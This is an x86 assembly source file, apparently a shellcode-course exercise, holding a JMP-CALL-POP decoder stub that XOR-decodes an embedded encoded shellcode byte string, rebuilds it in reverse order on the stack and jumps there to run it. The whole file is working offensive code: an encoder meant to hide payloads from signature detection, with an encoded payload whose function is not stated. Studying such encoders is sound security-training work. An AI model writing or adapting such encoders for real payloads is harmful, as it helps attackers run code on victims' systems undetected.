; Filename: encoder2.asm
; Author: Simon Lemire / 2018
; Description: Encoder shellcode
; Note:

global _start

section .text

_start:
	jmp short call_shellcode

decoder:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	pop esi				; address of shellcode
	mov edi, 0xaaaa9090	; end of shellcode marker
	sub esp, 0x7f		; make room on the stack (512 bytes)
	sub esp, 0x7f       ; make room on the stack
	sub esp, 0x7f       ; make room on the stack
	sub esp, 0x7f       ; make room on the stack

decode:
	mov bl, byte [esi + edx + 1] 	; read 1st encoded byte
	mov bh, byte [esi + edx + 2]	; read 2nd encoded byte
	mov cl, byte [esi + edx + 3]	; read 3rd encoded byte
	mov ch, byte [esi + edx + 4]	; read 4th encoded byte
	xor bl, byte [esi + edx]		; xor with the key byte
	xor bh, byte [esi + edx]		; xor with the key byte
	xor cl, byte [esi + edx]		; xor with the key byte
	xor ch, byte [esi + edx]		; xor with the key byte
	mov byte [esp + eax], ch		; store in memory in reverse order to restore original shellcode
    mov byte [esp + eax + 1], cl	; ..
	mov byte [esp + eax + 2], bh	; ..
	mov byte [esp + eax + 3], bl	; ..

	cmp dword [esi + edx + 5], edi	; check if we have reached the end of shellcode marked
	jz execute_shellcode			; if we do, jump to the shellcode and execute it
	
	inc edx
	inc edx
	inc edx
	inc edx
	inc edx
	add eax, 4
	jnz decode

execute_shellcode:
	jmp short esp

call_shellcode:
	call decoder
	encoder_shellcode: db 0xda,0xeb,0x84,0xd0,0xb0,0xdc,0x8f,0x3f,0x2b,0x07,0x38,0x3a,0x52,0x6b,0x7b,0x98,0x79,0x11,0xfe,0x28,0x08,0x53,0x9f,0x88,0xc5,0x07,0x09,0x0d,0x0d,0x6f,0x6c,0x6c,0x6e,0x04,0x7b,0xa4,0x45,0x2d,0xf8,0xb5,0xde,0x8e,0x86,0xb8,0xb4,0x91,0x70,0x18,0xc6,0xc0,0xe3,0x66,0x63,0x2e,0xa0,0xcc,0x82,0xd5,0xb5,0x0c,0x86,0x24,0xee,0xbb,0xf2,0x7e,0x26,0x7e,0x7e,0x7e,0x43,0x46,0x29,0x43,0x29,0x02,0xcb,0x33,0xe1,0x8b,0x97,0x57,0x12,0x17,0x5a,0xd0,0xf7,0x3b,0x6d,0xa9,0x6e,0x6e,0xd7,0x69,0xdc,0x83,0x0a,0x83,0x83,0x93,0xcf,0xc3,0x24,0x0e,0x2c,0x11,0xa1,0x1d,0xf2,0xd0,0xa0,0x25,0x20,0x6d,0xdd,0xeb,0xb0,0xfb,0x93,0x2b,0x1a,0xac,0x83,0xfb,0x93,0xf2,0x3f,0xf1,0x42,0xfe,0x8e,0xf6,0x4e,0x0b,0x0e,0xd2,0x6a,0x33,0x2d,0xd0,0x84,0x84,0x84,0x84,0x85,0xe3,0xe3,0xe3,0xe2,0x58,0x18,0x88,0x98,0xd5,0x18,0x90,0x90,0xaa,0xaa
